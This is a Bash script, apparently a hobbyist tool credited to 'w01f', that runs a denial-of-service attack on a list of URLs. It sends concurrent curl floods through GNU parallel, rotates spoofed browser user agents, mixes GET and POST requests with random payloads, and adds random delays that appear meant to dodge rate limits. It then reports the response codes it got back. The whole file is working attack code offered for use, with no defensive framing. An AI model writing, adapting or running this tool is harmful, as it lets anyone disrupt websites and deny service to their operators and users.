#!/bin/bash

usage() {
    echo "Usage: $0 -u <URLs> -c <concurrency> -t <duration> [-m] [-d]"
    echo "  -u <URLs>           Comma-separated list of URLs to target"
    echo "  -c <concurrency>    Number of concurrent requests"
    echo "  -t <duration>       Duration of the attack in seconds"
    echo "  -m                  Enable mixed HTTP methods (GET and POST)"
    echo "  -d                  Enable random delays between requests"
    echo "Scripted by w01f with love ..."
    exit 1
}

MIXED_METHODS=0
RANDOM_DELAYS=0
while getopts "u:c:t:md" opt; do
  case $opt in
    u) IFS=',' read -r -a TARGET_URLS <<< "$OPTARG"
    ;;
    c) CONCURRENCY="${OPTARG:-0}"
    ;;
    t) DURATION="${OPTARG:-0}"
    ;;
    m) MIXED_METHODS=1
    ;;
    d) RANDOM_DELAYS=1
    ;;
    *) usage
    ;;
  esac
done

if [ ${#TARGET_URLS[@]} -eq 0 ] || [ -z "$CONCURRENCY" ] || [ -z "$DURATION" ]; then
    usage
fi

send_requests() {
    local url=$1
    local end=$((SECONDS+${DURATION:-60}))
    local method="GET"
    local user_agent=$(random_user_agent)
    local delay=0
    local data=""
    local response_code

    while [ $SECONDS -lt $end ]; do
        if [ "${MIXED_METHODS:-0}" -eq 1 ] && [ $((RANDOM % 2)) -eq 0 ]; then
            method="POST"
            data="data=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 13)"
        fi

        if [ "${RANDOM_DELAYS:-0}" -eq 1 ]; then
            delay=$((RANDOM % 5 + 1))
            sleep $delay
        fi

        response_code=$(curl -s -o /dev/null -w "%{http_code}" -X $method -A "$user_agent" -d "$data" "$url")
        echo "$url $response_code" >> /tmp/dos_log.txt

        echo -n "."
    done
}

random_user_agent() {
    local agents=("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
                  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Safari/605.1.15"
                  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
                  "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.76 Mobile Safari/537.36")
    echo "${agents[$RANDOM % ${#agents[@]}]}"
}

export -f send_requests random_user_agent
export MIXED_METHODS DURATION

echo "Starting DoS attack. Press CTRL+C to stop..."
for url in "${TARGET_URLS[@]}"; do
    parallel -j $CONCURRENCY send_requests ::: "$url" &
done
wait

echo "Attack complete. Generating report..."
awk '{print $2}' /tmp/dos_log.txt | sort | uniq -c | awk 'BEGIN {print "Response Code Summary:"} {print "Code: "$2" - Count: "$1}' > /tmp/dos_report.txt
cat /tmp/dos_report.txt

echo "Logs are stored in /tmp/dos_log.txt. Detailed report in /tmp/dos_report.txt."
